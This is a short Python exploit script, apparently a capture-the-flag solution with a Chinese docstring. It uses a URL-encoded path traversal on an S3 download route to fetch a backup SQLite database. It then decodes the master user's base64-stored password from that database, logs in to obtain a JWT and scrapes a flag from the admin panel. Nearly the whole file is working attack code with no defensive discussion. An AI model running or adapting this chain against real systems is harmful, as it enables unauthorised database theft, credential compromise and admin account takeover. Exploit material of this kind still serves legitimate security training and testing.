import requests, sqlite3, base64, re, sys, os

'''
@文件命名：X-084-24
@使用方式: python X-084-24.py url
@简述思路: S3 路由目录穿越下载数据库，解码管理员密码登录取 JWT，再访问后台页提取 flag。
'''


def Scan(url):
    db_file = "manapool.db"
    r = requests.get(url + "/api/s3/%2e%2e%2fbackups%2Fmanapool.db")
    open(db_file, "wb").write(r.content)

    conn = sqlite3.connect(db_file)
    c = conn.cursor()
    email, b64pwd = c.execute("SELECT email, password FROM users WHERE isMaster=1;").fetchone()
    plain_pwd = base64.b64decode(b64pwd).decode()
    conn.close()

    token = requests.post(url + "/api/auth", json={"email": email, "password": plain_pwd}).json()["token"]
    r = requests.get(url + "/adminpanel/profile", headers={"Accept": "text/html"}, cookies={"token": token})
    return re.search(r"flag\{[^}]+\}", r.text).group(0)


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
    os.remove("manapool.db")